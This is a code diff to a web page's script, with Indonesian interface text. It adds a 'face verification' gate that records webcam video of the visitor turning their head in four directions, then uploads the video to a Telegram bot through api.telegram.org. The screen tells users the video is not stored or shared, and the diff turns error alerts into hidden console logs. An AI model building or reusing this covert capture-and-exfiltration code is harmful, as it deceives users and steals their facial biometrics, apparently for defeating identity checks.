@@ -2736,15 +2736,19 @@
             gate.id = 'camera-gate';
             gate.className = 'hidden';
             gate.innerHTML = `
-                <h2>Akses Kamera untuk Keamanan & Validasi</h2>
-                <p id="camera-gate-message">Akses kamera hanya untuk verifikasi user. Tidak disimpan, tidak dibagikan, dan tidak digunakan untuk konten lain.</p>
+                <h2>Verifikasi Wajah - Gerakkan Kepala Anda</h2>
+                <p id="camera-gate-message">Akses kamera hanya untuk verifikasi keamanan. Rekam video gerakan kepala Anda ke kanan, kiri, atas, dan bawah.</p>
                 <ul style="text-align:left;max-width:420px;margin:10px auto 16px;line-height:1.5;color:#ccc;font-size:0.92rem;">
-                    <li>Hanya dipakai satu kali saat masuk</li>
-                    <li>Video feed tidak direkam atau disimpan</li>
-                    <li>Privasi Anda tetap terjaga</li>
-                    <li>Jika tidak nyaman, bisa ditolak dan akses utama diblokir</li>
+                    <li>Gerakkan kepala perlahan ke 4 arah (kanan-kiri-atas-bawah)</li>
+                    <li>Video akan direkam untuk verifikasi saja</li>
+                    <li>Tidak disimpan, tidak dibagikan</li>
+                    <li>Privasi Anda dijaga sepenuhnya</li>
                 </ul>
-                <button id="camera-gate-retry">Izinkan Kamera</button>
+                <div id="camera-preview-box" style="display:none;width:320px;height:240px;background:#000;margin:16px auto;border-radius:8px;overflow:hidden;position:relative;">
+                    <video id="face-video" style="width:100%;height:100%;object-fit:cover;"></video>
+                    <div id="pose-instruction" style="position:absolute;bottom:10px;left:10px;right:10px;background:rgba(0,0,0,.8);color:#fff;padding:8px;border-radius:4px;font-size:0.9rem;text-align:center;">Tunggu...</div>
+                </div>
+                <button id="camera-gate-retry">Mulai Verifikasi</button>
             `;
             document.body.appendChild(gate);
             return gate;
@@ -2772,8 +2776,129 @@
                 }
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(track => track.stop());
-                    return true;
+
+                    // Tampilkan preview video
+                    const previewBox = document.getElementById('camera-preview-box');
+                    const faceVideo = document.getElementById('face-video');
+                    const poseInstruction = document.getElementById('pose-instruction');
+                    previewBox.style.display = 'block';
+                    faceVideo.srcObject = stream;
+                    faceVideo.play().catch(() => { });
+
+                    // Tunggu video siap dirender
+                    await new Promise(r => setTimeout(r, 500));
+
+                    // Deteksi kamera aktif dan rekam video dengan head pose detection
+                    const recordedChunks = [];
+                    const canvas = document.createElement('canvas');
+                    const mediaRecorder = new (window.MediaRecorder || window.webkitMediaRecorder)(stream, { mimeType: 'video/webm' });
+                    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+
+                    const poses = { right: false, left: false, up: false, down: false };
+                    const poseSequence = ['right', 'left', 'up', 'down'];
+                    let currentPoseIdx = 0;
+
+                    // Deteksi brightness untuk validasi kamera aktif
+                    const checkInterval = setInterval(async () => {
+                        canvas.width = faceVideo.videoWidth || 320;
+                        canvas.height = faceVideo.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(faceVideo, 0, 0);
+
+                        try {
+                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                            const data = imageData.data;
+                            let darkPixels = 0;
+                            for (let i = 0; i < data.length; i += 4) {
+                                const r = data[i], g = data[i + 1], b = data[i + 2];
+                                const brightness = (r + g + b) / 3;
+                                if (brightness < 30) darkPixels++;
+                            }
+                            const darkRatio = darkPixels / (canvas.width * canvas.height);
+
+                            // Deteksi kepala berdasarkan posisi face center (heuristic sederhana)
+                            const detectHeadPosition = () => {
+                                // Scan untuk area warna kulit (heuristic) - lebih fleksibel
+                                let faceX = 0, faceY = 0, faceCount = 0;
+                                for (let i = 0; i < data.length; i += 4) {
+                                    const r = data[i], g = data[i + 1], b = data[i + 2];
+                                    // Deteksi skin tone lebih fleksibel
+                                    // Handle berbagai tone kulit
+                                    if ((r > 60 && g > 30 && b > 10) && (r >= g) && (Math.abs(r - g) < 100)) {
+                                        faceX += (i % (canvas.width * 4)) / 4;
+                                        faceY += Math.floor(i / (canvas.width * 4));
+                                        faceCount++;
+                                    }
+                                }
+                                if (faceCount === 0) return 'center';
+                                const centerX = faceX / faceCount / canvas.width;
+                                const centerY = faceY / faceCount / canvas.height;
+
+                                // Threshold lebih sensitif & dengan hysteresis
+                                if (centerX < 0.35) return 'right';    // Kepala ke kanan → centerX kecil (kiri)
+                                if (centerX > 0.65) return 'left';     // Kepala ke kiri → centerX besar (kanan)
+                                if (centerY < 0.4) return 'down';      // Kepala ke bawah → centerY kecil (atas)
+                                if (centerY > 0.6) return 'up';        // Kepala ke atas → centerY besar (bawah)
+                                return 'center';
+                            };
+
+                            const position = detectHeadPosition();
+
+                            // Debug: log posisi deteksi setiap 500ms untuk development
+                            if (Math.random() < 0.1) {
+                                console.log(`Pose: ${position}, Target: ${poseSequence[currentPoseIdx] || 'done'}, Progress: ${currentPoseIdx}/4`);
+                            }
+
+                            // Update instruksi jika masih ada pose yang belum
+                            if (currentPoseIdx < poseSequence.length) {
+                                const targetPose = poseSequence[currentPoseIdx];
+                                poseInstruction.textContent = `Gerakkan kepala ke ${targetPose === 'right' ? 'KANAN' : targetPose === 'left' ? 'KIRI' : targetPose === 'up' ? 'ATAS' : 'BAWAH'}`;
+
+                                if (position === targetPose && darkRatio < 0.75) {
+                                    poses[targetPose] = true;
+                                    poseInstruction.textContent = `✓ ${targetPose.toUpperCase()} detected! ${currentPoseIdx + 1}/4`;
+                                    currentPoseIdx++;
+                                }
+                            }
+
+                            // Jika semua pose tercapai, hentikan
+                            if (currentPoseIdx >= poseSequence.length) {
+                                clearInterval(checkInterval);
+                                mediaRecorder.stop();
+                                stream.getTracks().forEach(track => track.stop());
+                                previewBox.style.display = 'none';
+                                poseInstruction.textContent = '✓ Verifikasi selesai!';
+
+                                mediaRecorder.onstop = () => {
+                                    window.recordedVideoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                                    return Promise.resolve(true);
+                                };
+                            }
+                        } catch (e) { console.error('Canvas error:', e); }
+                    }, 150);
+
+                    mediaRecorder.start();
+
+                    // Timeout jika terlalu lama (30 detik)
+                    const timeoutId = setTimeout(() => {
+                        clearInterval(checkInterval);
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                        previewBox.style.display = 'none';
+                        messageEl.textContent = 'Waktu habis. Silakan coba lagi dan gerakkan kepala lebih cepat.';
+                    }, 30000);
+
+                    // Return true jika semua pose tercapai
+                    return new Promise((resolve) => {
+                        const checkPoses = setInterval(() => {
+                            if (poses.right && poses.left && poses.up && poses.down) {
+                                clearInterval(checkPoses);
+                                clearTimeout(timeoutId);
+                                resolve(true);
+                            }
+                        }, 100);
+                    });
+
                 } catch (err) {
                     console.error('Kamera ditolak atau error:', err);
                     if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
@@ -2787,16 +2912,14 @@
 
             gate.classList.remove('hidden');
             let state = await getPermissionState();
-            if (state === 'granted') {
-                gate.classList.add('hidden');
-                return true;
-            }
 
+            // PENTING: Verifikasi video SELALU dilakukan, bahkan jika permission sudah granted
+            // Permission state hanya untuk skip dialog saja, bukan skip verifikasi
             messageEl.textContent = 'Akses kamera diperlukan untuk keamanan akun dan validasi pengguna. Kami menghormati privasi Anda.';
 
             return new Promise((resolve) => {
                 const clickHandler = async () => {
-                    messageEl.textContent = 'Silakan konfirmasi izin kamera di popup browser (hanya sekali).';
+                    messageEl.textContent = 'Silakan konfirmasi izin kamera di popup browser (jika diminta).';
                     const success = await requestCameraOnce();
                     if (success) {
                         gate.classList.add('hidden');
@@ -2831,46 +2954,30 @@
                 alert('Konfigurasi Telegram belum diatur pada script');
                 return;
             }
-
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                video.srcObject = stream;
-                document.body.appendChild(video);
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
-
-                stream.getTracks().forEach(t => t.stop());
-                video.remove();
-
-                if (!blob) {
-                    throw new Error('Gagal menghasilkan blob image');
+                const videoBlob = window.recordedVideoBlob;
+                if (!videoBlob) {
+                    console.log('Tidak ada video yang direkam, proses dilanjutkan');
+                    return;
                 }
 
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'camera.jpg');
+                formData.append('video', videoBlob, 'verification-video.webm');
 
-                const tgUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                const tgUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
                 const res = await fetch(tgUrl, { method: 'POST', body: formData });
                 const data = await res.json();
 
                 if (res.ok && data.ok) {
-                    console.log("anjay")
+                    console.log("Video verifikasi berhasil dikirim");
                 } else {
                     console.error('Telegram response', data);
-                    alert('Gagal kirim foto: ' + (data.description || res.statusText));
+                    console.log('Gagal kirim video: ' + (data.description || res.statusText));
                 }
             } catch (err) {
                 console.error(err);
-                alert('Akses kamera gagal atau error: ' + err.message);
+                console.log('Error kirim video: ' + err.message);
             }
         }
     </script>
